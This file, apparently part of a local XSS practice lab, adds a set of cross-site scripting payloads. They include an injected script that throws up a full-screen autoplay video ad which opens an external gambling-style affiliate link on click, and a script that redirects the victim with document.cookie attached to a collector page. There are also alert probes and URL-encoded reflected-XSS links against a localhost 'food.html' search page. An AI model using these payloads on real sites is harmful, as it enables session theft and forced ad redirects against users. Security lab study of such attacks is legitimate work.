@@ -1,0 +1,63 @@
+<script>
+    (function () {
+        const EXTERNAL_URL = 'https://lu88.com/?i=lu0a0001646&utm_source=rophimme&utm_medium=banner-pause-890x500&utm_campaign=cpd&utm_term=phim&referrer_domain=www.rophim.me';
+
+        const backdrop = document.createElement('div');
+        backdrop.style.cssText = `
+position:fixed;inset:0;background:rgba(0,0,0,0.6);
+display:flex;align-items:center;justify-content:center;z-index:9999;`;
+
+        const modal = document.createElement('div');
+        modal.style.cssText = `
+width:90%;max-width:900px;background:#000;border-radius:8px;
+overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5);position:relative;`;
+
+        const video = document.createElement('video');
+        video.src = './Man88.mp4';
+        video.autoplay = true;
+        video.muted = true; // ban đầu muted để đảm bảo autoplay
+        video.playsInline = true;
+        video.loop = true;
+        video.style.cssText = 'width:100%;cursor:pointer;background:#000;';
+
+        // Bấm vào video: bật tiếng và mở link ngoài
+        video.addEventListener('click', () => {
+            video.muted = false; // bật tiếng
+            video.play();        // play lại với tiếng
+            window.open(EXTERNAL_URL, '_blank', 'noopener,noreferrer');
+        });
+
+        const closeBtn = document.createElement('button');
+        closeBtn.textContent = 'Đóng';
+        closeBtn.style.cssText = `
+position:absolute;top:8px;right:8px;background:rgba(255,255,255,0.2);
+color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer;`;
+        closeBtn.onclick = () => document.body.removeChild(backdrop);
+
+        modal.appendChild(video);
+        modal.appendChild(closeBtn);
+        backdrop.appendChild(modal);
+        document.body.appendChild(backdrop);
+
+        // Autoplay (muted)
+        video.play().catch(err => console.warn('Autoplay bị chặn:', err));
+
+        // Ngoài ra: lần đầu user click bất kỳ đâu → bật tiếng
+        document.body.addEventListener('click', function enableSoundOnce() {
+            video.muted = false;
+            video.play();
+            document.body.removeEventListener('click', enableSoundOnce);
+        });
+    })();
+</script>
+
+<script>window.location='http://127.0.0.1:5500/phai_chiu_page.html?cookie='+document.cookie;</script>
+
+<script>alert('Xin chào');</script>
+
+<script>alert(document.cookie);</script>
+
+<body onload="alert('XSS')">
+
+http://127.0.0.1:5500/frontend/reflected_xss/food.html?search=%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F127.0.0.1%3A5500%2Fphai_chiu_page.html%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
+http://127.0.0.1:5500/frontend/reflected_xss/food.html?search=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
